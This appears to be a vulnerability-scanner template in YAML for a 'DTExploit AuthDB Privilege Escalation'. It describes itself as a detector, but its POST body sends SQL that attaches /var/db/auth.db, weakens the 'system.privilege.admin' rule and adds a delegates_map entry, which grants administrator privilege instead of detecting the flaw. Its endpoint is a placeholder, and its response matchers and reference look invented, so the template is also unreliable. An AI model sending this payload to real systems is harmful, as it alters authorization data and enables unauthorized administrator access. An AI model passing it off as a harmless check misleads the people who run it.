id: dtexploit-authdb-privilege-escalation

info:
  name: DTExploit AuthDB Privilege Escalation
  author: nullevent + WilDN00B
  severity: critical
  description: |
    Detects potential privilege escalation vulnerability in DTEX systems via unauthorized modifications to auth.db.
  reference:
    - https://example.com/dtexploit-details
  tags: privilege-escalation, dtexploit, authdb

requests:
  - method: POST
    path:
      - "{{BaseURL}}/dtexploit-endpoint"  # Adjust the endpoint as necessary
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      ATTACH DATABASE '/var/db/auth.db' AS authdb KEY '';
      select id from rules where name = 'system.privilege.admin';
      UPDATE rules SET type = 1, class = 2, 'group' = NULL, kofn = NULL, timeout = NULL, flags = 0, tries = NULL, version = 1, hash = NULL, identifier = NULL, comment = NULL where id = {{id}};
      INSERT INTO delegates_map VALUES({{id}},24,0);
      DETACH DATABASE 'authdb';
    matchers:
      - type: word
        words:
          - "Attach DB response"
          - "ID response"
          - "UPDATE response"
          - "INSERT response"
          - "Detach db response"
        condition: and
      - type: status
        status:
          - 200
